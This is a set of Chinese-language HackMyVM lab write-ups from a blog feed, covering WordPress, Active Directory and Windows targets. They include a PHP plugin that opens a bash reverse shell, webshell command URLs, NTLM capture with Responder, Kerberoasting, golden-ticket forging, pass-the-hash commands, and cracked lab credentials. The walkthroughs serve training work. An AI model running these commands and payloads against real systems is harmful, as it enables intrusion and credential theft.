alt="image-20250525121726232"></p><p>这里要获得shell可以上传恶意插件例如我们直接上传一个压缩后的反弹shell恶意文件</p><p>上传后直接直接激活即可得到shell我们可以直接利用wordpwn.py</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">✅ 使用流程</span><br><span class="line">① 执行脚本</span><br><span class="line"></span><br><span class="line">python wordpwn.py 192.168.0.6 8888 Y</span><br><span class="line"></span><br><span class="line">192.168.0.6 是你的监听 IP；</span><br><span class="line"></span><br><span class="line">8888 是监听端口；</span><br><span class="line"></span><br><span class="line">Y 表示自动启动 Metasploit Handler（相当于执行了 msfconsole -x use exploit/multi/handler ...）。</span><br><span class="line"></span><br><span class="line">生成后，会在当前目录得到：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malicious.zip  ← 插件文件，内含反弹 shell 和 WebShell</span><br><span class="line">② 上传插件</span><br><span class="line">访问 WordPress 插件上传页面（登录后台后）：</span><br><span class="line"></span><br><span class="line">http://&lt;目标IP&gt;/wp-admin/plugin-install.php?tab=upload</span><br><span class="line">上传 malicious.zip，然后点击“启用插件”。</span><br><span class="line"></span><br><span class="line">③ 执行 shell（两种方式）</span><br><span class="line">反弹连接：</span><br><span class="line"></span><br><span class="line">你需要提前监听反向连接（或者由 wordpwn.py 启动的 handler 已在监听）；</span><br><span class="line"></span><br><span class="line">一旦启用插件，它会发起连接到你的机器。</span><br><span class="line"></span><br><span class="line">Webshell（备用/稳定访问）</span><br><span class="line">可访问以下页面执行命令：</span><br><span class="line"></span><br><span class="line">http://&lt;目标IP&gt;/wp-content/plugins/malicious/wetw0rk_maybe.php</span><br><span class="line">http://&lt;目标IP&gt;/wp-content/plugins/malicious/QwertyRocks.php</span><br><span class="line">http://&lt;目标IP&gt;/wp-content/plugins/malicious/SWebTheme.php?cmd=ls</span><br><span class="line">最后一条 URL 是具备 cmd 参数功能的 WebShell，你可以换成：</span><br><span class="line"></span><br><span class="line">?cmd=cat /etc/passwd</span><br><span class="line">?cmd=whoami</span><br><span class="line">?cmd=uname -a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://github.com/wetw0rk/malicious-wordpress-plugin">https://github.com/wetw0rk/malicious-wordpress-plugin</a></p><p><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></p><p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress">https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress</a></p><p>也可以自己搞一个zip文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Plugin Name: GetRev</span><br><span class="line"> * Version: 10.8.1</span><br><span class="line"> * Author: PwnedSauce</span><br><span class="line"> * Author URI: http://PwnedSauce.com</span><br><span class="line"> * License: GPL2</span><br><span class="line"> */</span><br><span class="line">exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后压缩为zip文件上传为插件即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525141910306.png" alt="image-20250525141910306"></p><p>终于拿到shell了我cao了</p><p>这个靶机上传插件这里非常卡</p><p>而且wordpwn.py这个方法一直拿不到shell不知道是什么原因</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525143441478.png" alt="image-20250525143441478"></p><p>当前为docker环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@3ed5ddfe0e0c:/var/www/html/wp-admin$ env</span><br><span class="line">env</span><br><span class="line">HOSTNAME=3ed5ddfe0e0c</span><br><span class="line">PHP_VERSION=8.2.22</span><br><span class="line">APACHE_CONFDIR=/etc/apache2</span><br><span class="line">PHP_INI_DIR=/usr/local/etc/php</span><br><span class="line">GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC</span><br><span class="line">PHP_LDFLAGS=-Wl,-O1 -pie</span><br><span class="line">PWD=/var/www/html/wp-admin</span><br><span class="line">APACHE_LOG_DIR=/var/log/apache2</span><br><span class="line">LANG=C</span><br><span class="line">PHP_SHA256=8566229bc88ad1f4aadc10700ab5fbcec81587c748999d985f11cf3b745462df</span><br><span class="line">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span><br><span class="line">WORDPRESS_DB_HOST=db</span><br><span class="line">PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c</span><br><span class="line">TERM=hash</span><br><span class="line">PHP_URL=https://www.php.net/distributions/php-8.2.22.tar.xz</span><br><span class="line">APACHE_RUN_GROUP=www-data</span><br><span class="line">APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line">SHLVL=4</span><br><span class="line">PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</span><br><span class="line">WORDPRESS_DB_PASSWORD=Fukurokuju</span><br><span class="line">APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line">APACHE_ENVVARS=/etc/apache2/envvars</span><br><span class="line">APACHE_RUN_USER=www-data</span><br><span class="line">WORDPRESS_DB_USER=matrioska</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">WORDPRESS_DB_NAME=wordpressdb</span><br><span class="line">PHP_ASC_URL=https://www.php.net/distributions/php-8.2.22.tar.xz.asc</span><br><span class="line">PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525143755685.png" alt="image-20250525143755685"></p><p>得到一组用户密码</p><p>直接ssh登录(matrioska&#x2F;Fukurokuju)</p><p>但是连不上</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525144247070.png" alt="image-20250525144247070"></p><p>和靶机名对比一下就是缺了个h</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525144353784.png" alt="image-20250525144353784"></p><p>得到userflag</p><p>接下来就是提权</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250526184533594.png" alt="image-20250526184533594"></p><p>很多网卡</p><p>对不同的网段进行扫描(busybox wget可以下载东西)</p><p>后面按照视频讲解的</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250527171311263.png" alt="image-20250527171311263"></p><p>172.19.0.2是有一个文件服务的</p><p>但是靶机好像出毛病了</p><p>并没有这个服务后面是要打一个CVE-2024-39943</p><p>就是可以</p><p>得到dockershell后</p><p>在进行一个</p><p>docker run -v &#x2F;:&#x2F;mnt –rm -it ubuntu:20.04 chroot &#x2F;m&gt;</p><p>具体操作可以去看视频</p><p><a href="https://www.bilibili.com/video/BV1NXRHYJE14/?vd_source=7ae4ab7583485394a0dfb021c9d73c89">https://www.bilibili.com/video/BV1NXRHYJE14/?vd_source=7ae4ab7583485394a0dfb021c9d73c89</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_dc04</title>
      <link href="/2025/05/29/hackmyvm-dc04/"/>
      <url>/2025/05/29/hackmyvm-dc04/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250509190129632.png" alt="image-20250509190129632"></p><p>端口扫描</p><p>给扫到的域名加入hosts文件</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509191035192.png" alt="image-20250509191035192"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SMB (445)</span><br><span class="line">Kerberos (88)</span><br><span class="line">LDAP (389, 3268)</span><br><span class="line">RPC (135, 593)</span><br><span class="line">DNS (53)</span><br><span class="line">暂时都利用失败</span><br></pre></td></tr></table></figure><p>80端口服务目录扫描</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509193334767.png" alt="image-20250509193334767"></p><p>找到新的域名加入host文件</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509194503195.png" alt="image-20250509194503195"></p><p><a href="http://heartbeat.soupedecode.local/login.php">http://heartbeat.soupedecode.local/login.php</a></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509195653491.png" alt="image-20250509195653491"></p><p>对登陆页面进行测试</p><p>爆破出密码:</p><p>admin&#x2F;nimda</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509204621351.png" alt="image-20250509204621351"></p><p>使用responder进行欺骗尝试拿到hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -I eth1 -Pdv</span><br></pre></td></tr></table></figure><p>下面是详细的解释:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Web 应用的功能： 登录后的 Web 页面 (http://heartbeat.soupedecode.local:8080/login.php 成功登录后跳转的页面) 提供了一个 &quot;Network Share Connect&quot; 功能。这意味着这个页面背后的服务器端代码（很可能是 PHP）会接收你输入的 IP 地址，并尝试从目标服务器 (192.168.56.126) 发起一个网络共享连接到你提供的 IP 地址。</span><br><span class="line"></span><br><span class="line">输入攻击机 IP： 当你输入 192.168.56.103 (你的 Kali 攻击机 IP) 并提交时，目标服务器 (192.168.56.126) 上的 Web 应用代码被指示要去连接 \\192.168.56.103\（或者类似的 SMB/CIFS 路径）。</span><br><span class="line"></span><br><span class="line">目标服务器发起连接和认证： 目标服务器的操作系统（或者运行 Web 应用/执行连接的用户账户）尝试按照指令连接到你攻击机的 SMB 服务 (通常是 445 端口)。在尝试建立连接时，Windows 系统会自动使用当前运行发起连接的进程的用户的凭据进行 NTLM 认证 尝试。</span><br><span class="line"></span><br><span class="line">Responder 扮演流氓 SMB 服务器： 在你的 Kali 机器上，Responder 正在运行并监听 eth1 接口上的各种服务，包括 SMB (端口 445)。当目标服务器尝试连接到你的 192.168.56.103:445 时，Responder 冒充一个合法的 SMB 服务器接收了这个连接。</span><br><span class="line"></span><br><span class="line">捕获 NTLM 哈希： 当目标服务器发起 NTLM 认证尝试时，它发送了用户名、域名、质询和计算出的响应。Responder 的流氓 SMB 服务器接收到这些信息，并立即将其记录和显示出来，这就是你捕获到的 NTLMv2 哈希。</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509204605620.png" alt="image-20250509204605620"></p><p>爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 -a 0 test.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250509213517915.png" alt="image-20250509213517915"></p><p>websvc&#x2F;jordan23</p><p>然后就卡着了远程登陆不成功</p><p>smb也失败了</p><p>是密码过期了</p><p>直接去改一下就好了这里改为了jordan123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;websvc&#x27; -p &#x27;jordan123&#x27; --shares</span><br><span class="line">smbmap -H 192.168.56.128 -u websvc -p jordan123</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250510212853293.png" alt="image-20250510212853293"></p><p>在websvc桌面找到user.txt</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250510213955738.png" alt="image-20250510213955738"></p><p>rtina979不让查看内容</p><p>应该就是在这里了</p><p>利用rpc查看rina979的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U SOUPEDDECODE.LOCAL/websvc%jordan123 192.168.56.126 -c &quot;querydispinfo&quot; | grep rtina979</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250510215434446.png" alt="image-20250510215434446"></p><p>密码也过期了</p><p>改为myift123</p><p>继续smb信息收集</p><p><code>Report.rar</code> 压缩包，下载之后发现需要密码</p><p><strong><code>rar2john</code> + <code>john</code></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rar2john report.rar &gt; report.txt  </span><br><span class="line">提取文件hash</span><br><span class="line">john report.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">爆破hash</span><br></pre></td></tr></table></figure><p>0f55cdc40bd8f5814587f7e6b2f85e6f</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250523141539871.png" alt="image-20250523141539871"></p><p>得到密码为</p><p>PASSWORD123</p><p>得到htm文件</p><p>的到krbrgt的hash</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250523142626324.png" alt="image-20250523142626324"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250523153203002.png" alt="image-20250523153203002"></p><p>hash是正确的</p><p>黄金票据攻击</p><p>我们要想伪造黄金票据还需要得到域的sid</p><p>Domain SID is: S-1-5-21-2986980474-46765180-2505414164</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250523154021693.png" alt="image-20250523154021693"></p><p>ntpdate -n soupedecode.local<br>ntpdate -u 192.168.56.126</p><p>同步时间</p><p>创建文件</p><p>&#x2F;etc&#x2F;krb5.conf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = SOUPEDECODE.LOCAL</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    SOUPEDECODE.LOCAL = &#123;</span><br><span class="line">        kdc = dc01.soupedecode.local</span><br><span class="line">        admin_server = dc01.soupedecode.local</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    soupedecode.local = SOUPEDECODE.LOCAL</span><br><span class="line">    .soupedecode.local = SOUPEDECODE.LOCAL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5_CONFIG=/etc/krb5.conf    </span><br><span class="line">impacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain SOUPEDECODE.LOCAL administrator</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">impacket-wmiexec soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126 </span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524152624989.png" alt="image-20250524152624989"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_dc01</title>
      <link href="/2025/05/29/hackmyvm-dc01/"/>
      <url>/2025/05/29/hackmyvm-dc01/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250428213034133.png" alt="image-20250428213034133"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427211654125.png" alt="image-20250427211654125"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统：Windows（域控服务器，主机名：DC01）</span><br><span class="line"></span><br><span class="line">开放端口和服务：</span><br><span class="line"></span><br><span class="line">53 - DNS</span><br><span class="line"></span><br><span class="line">88 - Kerberos（认证服务）</span><br><span class="line"></span><br><span class="line">135 - RPC</span><br><span class="line"></span><br><span class="line">139/445 - SMB（文件共享）</span><br><span class="line"></span><br><span class="line">389/3268 - LDAP（AD 目录服务）</span><br><span class="line"></span><br><span class="line">464 - Kerberos密码修改</span><br><span class="line"></span><br><span class="line">593 - RPC over HTTP</span><br><span class="line"></span><br><span class="line">636/3269 - LDAPS（加密LDAP）</span><br><span class="line"></span><br><span class="line">其他信息：</span><br><span class="line"></span><br><span class="line">域名是：SOUPEDECODE.LOCAL</span><br><span class="line"></span><br><span class="line">SMB要求签名（意味着直接pass-the-hash/relay SMB攻击受限）</span><br><span class="line"></span><br><span class="line">时间存在时钟偏移（+15小时）</span><br></pre></td></tr></table></figure><p>先给域名加入hosts文件</p><p>然后收集smb信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;anonymous&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;banyio&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">smbmap -H 192.168.56.128 -u guest</span><br><span class="line">smbmap -H 192.168.56.128 -u anonymous</span><br><span class="line">smbmap -H 192.168.56.128 -u banyio</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250428215907925.png" alt="image-20250428215907925"></p><p>可以利用guest对IPC$的可读权限进行域用户和域用户名的枚举</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; 192.168.56.128</span><br><span class="line">enumdomusers</span><br><span class="line">enumdomgroups</span><br><span class="line">querydominfo</span><br><span class="line">lsaquery</span><br><span class="line">失败</span><br><span class="line"> impacket-lookupsid banyio@192.168.56.128</span><br><span class="line"> nxc smb 192.168.56.128 -u guest -p &quot;&quot; --rid-brute</span><br><span class="line">枚举成功</span><br><span class="line">两者的区别</span><br><span class="line">rpcclient enumdomusers</span><br><span class="line">→ 相当于“老板，能给我公司所有员工名单吗？”</span><br><span class="line">→ 如果你只是个门卫（guest用户），老板肯定不答应你。</span><br><span class="line">lookupsid.py</span><br><span class="line">→ 相当于“自己偷偷查，每个员工ID是不是在这家公司”，一个个试出来的。</span><br><span class="line">→ 慢，但是只要门还开着（IPC$连得上），你就能一点点摸出来。</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250428224318418.png" alt="image-20250428224318418"></p><p>提取出用户名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-lookupsid banyio@192.168.56.128 &gt; name.txt 或nxc smb 192.168.0.202 -u guest -p &quot;&quot; --rid-brute | tee nxc.rid.txt</span><br><span class="line"></span><br><span class="line">cat name.txt | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | cut -d &#x27; &#x27; -f1 &gt; user.txt或</span><br><span class="line">garffff@garffff:~/hackmyvm/dc01$ cat nxc.rid.txt | grep SidTypeUser | awk &#x27;&#123;print $6&#125;&#x27; | cut -d &quot;\\&quot; -f 2 &gt; users.txt</span><br><span class="line">nxc smb $IP -u websvc -p &#x27;jordan23&#x27; --rid-brute | grep SidTypeUser |cut -d: -f2 |cut -d \\ -f2 |cut -d &#x27; &#x27; -f1 &gt; names.txt</span><br></pre></td></tr></table></figure><p>进行爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 192.168.56.128 -u user.txt -p user.txt</span><br><span class="line">nxc smb 192.168.56.128 -u user.txt -p user.txt --no-brute这样的是行行对应爆破</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429201612352.png" alt="image-20250429201612352"></p><p>爆出用户名密码</p><p>登录并找到flag</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429202252541.png" alt="image-20250429202252541"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429202304806.png" alt="image-20250429202304806"></p><p>接下来就是提权找另一个用户了</p><p>下面是就是Kerberoasting攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429211918881.png" alt="image-20250429211918881"></p><p>再次查看端口发现是因为时间不同步造成的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntpdate -q SOUPEDECODE.LOCAL</span><br><span class="line"></span><br><span class="line">faketime &#x27;53998 seconds&#x27; impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request</span><br></pre></td></tr></table></figure><p>这样就解决了时间不同步问题</p><p>接下来就是爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faketime &#x27;53998 seconds&#x27; impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request -outputfile hash.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">这个看不出密码是哪个用户的</span><br><span class="line">所以可以用</span><br><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429214820003.png" alt="image-20250429214820003"></p><p>得道密码Password123!!用户为file_svc</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429220227013.png" alt="image-20250429220227013"></p><p>多了一些权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.56.128/backup -U file_svc</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429220426033.png" alt="image-20250429220426033"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/dc1]</span><br><span class="line">└─# cat backup_extract.txt </span><br><span class="line">WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::</span><br><span class="line">DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::</span><br><span class="line">CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</span><br><span class="line">FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::</span><br><span class="line">MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::</span><br><span class="line">BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::</span><br><span class="line">ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::</span><br><span class="line">PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::</span><br><span class="line">ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::</span><br><span class="line">MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</span><br></pre></td></tr></table></figure><p>接下来将用户名和密码分开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat backup_extract.txt | cut -d &quot;:&quot; -f 1 &gt; new_users.txt</span><br><span class="line">cat backup_extract.txt | cut -d &#x27;:&#x27; -f4 &gt; hashes.txt</span><br><span class="line">爆破</span><br><span class="line">nxc smb 192.168.56.128 -u new_users.txt -H hashes.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429221624556.png" alt="image-20250429221624556"></p><p>得到对应的用户和密码</p><p>SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.0.2.31 -u &#x27;FileServer$&#x27; -H e41da7e79a4c76dbd9cf79d1cb325559(用的WinRM协议)</span><br><span class="line">或</span><br><span class="line">wmiexec.py &#x27;SOUPEDECODE.LOCAL/FileServer$@192.168.56.128&#x27; -hashes :e41da7e79a4c76dbd9cf79d1cb325559(用的WMI协议)</span><br></pre></td></tr></table></figure><p>远程连接获得shell</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429222950754.png" alt="image-20250429222950754"></p><p>rootflag</p><p>在admin桌面</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250429223332116.png" alt="image-20250429223332116"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_always</title>
      <link href="/2025/05/29/hackmyvm-always/"/>
      <url>/2025/05/29/hackmyvm-always/</url>
      
        <content type="html"><![CDATA[<p>寻找靶机+初步扫描</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425210703968.png" alt="image-20250425210703968"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -sV -sC 192.168.106.135                                                                            </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-25 09:03 EDT</span><br><span class="line">Nmap scan report for 192.168.106.135</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp    open  ssh          OpenSSH for_Windows_9.5 (protocol 2.0)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">8080/tcp  open  http         Apache httpd 2.4.57 ((Win64))</span><br><span class="line">|_http-server-header: Apache/2.4.57 (Win64)</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: We Are Sorry</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:35:C5:3D (VMware)</span><br><span class="line">Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: Always-PC</span><br><span class="line">|   NetBIOS computer name: ALWAYS-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2025-04-25T21:04:48+03:00</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-04-25T18:04:48</span><br><span class="line">|_  start_date: 2025-04-25T18:01:03</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:35:c5:3d (VMware)</span><br><span class="line">|_clock-skew: mean: 3h59m59s, deviation: 1h43m55s, median: 4h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 69.90 seconds</span><br><span class="line">                                                                                                            </span><br></pre></td></tr></table></figure><p>根据所得信息我们先去尝试</p><p>FTP（端口 21）——匿名登录尝试</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425212324213.png" alt="image-20250425212324213"></p><p>失败了进行下一步</p><p>去8080端口扫目录</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425212352520.png" alt="image-20250425212352520"></p><p>扫到了后台登陆页面</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425212415963.png" alt="image-20250425212415963"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        function validateForm() &#123;</span><br><span class="line">            const username = document.getElementById(&quot;username&quot;).value;</span><br><span class="line">            const password = document.getElementById(&quot;password&quot;).value;</span><br><span class="line">            const errorMessage = document.getElementById(&quot;errorMessage&quot;);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            if (username === &quot;admin&quot; &amp;&amp; password === &quot;adminpass123&quot;) &#123;</span><br><span class="line">                return true; </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            errorMessage.textContent = &quot;Invalid Username Or Password!&quot;;</span><br><span class="line">            return false; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">密码直接就给你了</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425212649649.png" alt="image-20250425212649649"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425212740140.png" alt="image-20250425212740140"></p><p>得到了ftp的登录用户</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425213103738.png" alt="image-20250425213103738"></p><p>登陆后进行信息收集</p><p><img 